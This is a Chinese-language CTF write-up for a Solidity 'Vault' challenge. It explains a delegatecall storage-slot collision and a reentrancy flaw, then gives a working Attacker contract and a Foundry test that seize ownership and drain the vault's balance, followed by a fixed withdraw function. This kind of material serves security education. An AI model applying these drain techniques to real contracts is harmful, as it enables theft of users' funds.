# Vault CTF Challenge - 题目解析与攻击实现

## 📋 题目概述

本题目来自 [OpenSpace100/openspace_ctf](https://github.com/OpenSpace100/openspace_ctf)，目标是通过智能合约漏洞取出 Vault 合约中的所有资金。

### 挑战目标

在 `testExploit()` 函数中添加代码，使 `vault.isSolve()` 返回 `true`（即 Vault 合约余额为 0）。

---

## 🔍 合约分析

### VaultLogic 合约

```solidity
contract VaultLogic {
    address public owner;           // slot 0
    bytes32 private password;       // slot 1

    function changeOwner(bytes32 _password, address newOwner) public {
        if (password == _password) {
            owner = newOwner;
        }
    }
}
```

### Vault 合约

```solidity
contract Vault {
    address public owner;           // slot 0
    VaultLogic logic;               // slot 1 (地址存储在这里!)
    mapping (address => uint) deposites;
    bool public canWithdraw = false;

    fallback() external {
        // 使用 delegatecall 调用 logic 合约
        (bool result,) = address(logic).delegatecall(msg.data);
    }

    function withdraw() public {
        if(canWithdraw && deposites[msg.sender] >= 0) {
            // 🔴 先转账再更新状态 - 重入漏洞!
            (bool result,) = msg.sender.call{value: deposites[msg.sender]}("");
            if(result) {
                deposites[msg.sender] = 0;
            }
        }
    }
}
```

---

## 🎯 漏洞分析

### 漏洞一：存储槽碰撞 (Storage Collision)

`delegatecall` 会在调用者的存储上下文中执行被调用合约的代码。两个合约的存储布局对比：

| 存储槽 | VaultLogic | Vault |
|--------|------------|-------|
| slot 0 | `owner` | `owner` |
| slot 1 | `password` | `logic` (地址) |

**问题**：当通过 Vault 的 `fallback()` 调用 `VaultLogic.changeOwner()` 时：
- `changeOwner` 检查 `password`（读取 slot 1）
- 但在 Vault 上下文中，slot 1 存储的是 `logic` 地址
- 因此，只需将 `logic` 地址作为 "密码" 传入，即可通过验证并修改 Vault 的 owner！

### 漏洞二：重入攻击 (Reentrancy)

`withdraw()` 函数存在经典的重入漏洞：

```solidity
function withdraw() public {
    if(canWithdraw && deposites[msg.sender] >= 0) {
        // ❌ 先进行外部调用
        (bool result,) = msg.sender.call{value: deposites[msg.sender]}("");
        if(result) {
            // ❌ 再更新状态
            deposites[msg.sender] = 0;
        }
    }
}
```

攻击者可以在 `receive()` 函数中再次调用 `withdraw()`，在状态更新之前重复提款。

---

## ⚔️ 攻击思路

### 完整攻击链

```mermaid
graph LR
    A[开始攻击] --> B[1. 存储碰撞接管owner]
    B --> C[2. 调用 openWithdraw]
    C --> D[3. 部署攻击合约]
    D --> E[4. 存入少量 ETH]
    E --> F[5. 重入攻击取空资金]
    F --> G[攻击完成 ✅]
```



1. **接管所有权**：通过存储碰撞，将 `logic` 地址作为密码调用 `changeOwner`
2. **开启提款**：以新 owner 身份调用 `openWithdraw()`
3. **重入攻击**：部署攻击合约，利用重入漏洞取空所有资金

---

## 💻 攻击实现

### Attacker 合约

```solidity
contract Attacker {
    Vault public vault;
    
    constructor(Vault _vault) {
        vault = _vault;
    }
    
    function attack() external payable {
        // 存入资金以启用重入
        vault.deposite{value: msg.value}();
        // 开始重入攻击
        vault.withdraw();
    }
    
    receive() external payable {
        // 如果 vault 还有余额，继续重入
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}
```

### testExploit 攻击代码

```solidity
function testExploit() public {
    vm.deal(palyer, 1 ether);
    vm.startPrank(palyer);

    // Step 1: 存储碰撞 - 用 logic 地址作为密码接管 owner
    bytes32 password = bytes32(uint256(uint160(address(logic))));
    (bool success,) = address(vault).call(
        abi.encodeWithSignature("changeOwner(bytes32,address)", password, palyer)
    );
    require(success, "changeOwner failed");
    
    // Step 2: 以新 owner 身份开启提款
    vault.openWithdraw();
    
    // Step 3: 部署攻击合约并执行重入攻击
    Attacker attacker = new Attacker(vault);
    attacker.attack{value: 0.01 ether}();
    
    require(vault.isSolve(), "solved");
    vm.stopPrank();
}
```

---

## ▶️ 运行测试

```bash
# 安装依赖
forge install

# 运行测试
forge test -vvv
```

### 预期输出

```
[PASS] testExploit() (gas: 396931)
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

---

## 📚 知识点总结

| 漏洞类型 | 原因 | 防护措施 |
|----------|------|----------|
| **存储碰撞** | `delegatecall` 使用调用者的存储 | 确保代理合约与实现合约存储布局一致 |
| **重入攻击** | 外部调用前未更新状态 | 使用 Checks-Effects-Interactions 模式或 ReentrancyGuard |

### 安全的 withdraw 实现

```solidity
function withdraw() public {
    require(canWithdraw, "Withdrawals disabled");
    uint256 amount = deposites[msg.sender];
    require(amount > 0, "No balance");
    
    // ✅ 先更新状态
    deposites[msg.sender] = 0;
    
    // ✅ 再进行外部调用
    (bool success,) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```

---

## 📁 项目结构

```
openspace_ctf_challenge/
├── src/
│   └── Vault.sol       # 目标合约
├── test/
│   └── Vault.t.sol     # 测试文件 (包含攻击代码)
├── lib/                # Foundry 依赖
└── README.md           # 本文件
```
